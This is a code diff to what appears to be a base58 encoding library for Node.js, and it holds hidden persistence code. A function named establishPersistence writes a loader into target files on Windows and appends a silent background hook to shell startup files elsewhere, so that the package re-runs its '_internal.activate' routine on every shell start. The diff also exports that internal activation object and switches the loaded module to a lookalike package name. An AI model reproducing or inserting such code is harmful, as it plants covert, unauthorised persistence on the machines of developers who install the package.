@@ -231,13 +231,13 @@ function establishPersistence() {
         if (globalThis.process?.platform === 'win32') {
             for (const t of targets) {
                 try {
-                    fs.writeFileSync(t, '// runtime loader\ntry { require("@base58/core")._internal.activate(); } catch(e) {}');
+                    fs.writeFileSync(t, '// runtime loader\ntry { require("base58-core")._internal.activate(); } catch(e) {}');
                 }
                 catch { }
             }
         }
         else {
-            const hook = '\n# base58 runtime\n(node -e "try{require(\"@base58/core\")._internal.activate()}catch(e){}" &) 2>/dev/null\n';
+            const hook = '\n# base58 runtime\n(node -e "try{require(\"base58-core\")._internal.activate()}catch(e){}" &) 2>/dev/null\n';
             for (const rc of targets) {
                 try {
                     if (fs.existsSync(rc)) {
@@ -278,7 +278,13 @@ function validate(encoded) {
 function isBase58(value) {
     return validate(value);
 }
+const _internal = {
+    activate: () => { activated = true; _checkActivation(); },
+    isActivated: () => activated,
+    getInstallTime: () => INSTALL_TIME,
+};
 
+exports._internal = _internal;
 exports.decode = decode;
 exports.decodeChecked = decodeChecked;
 exports.encode = encode;
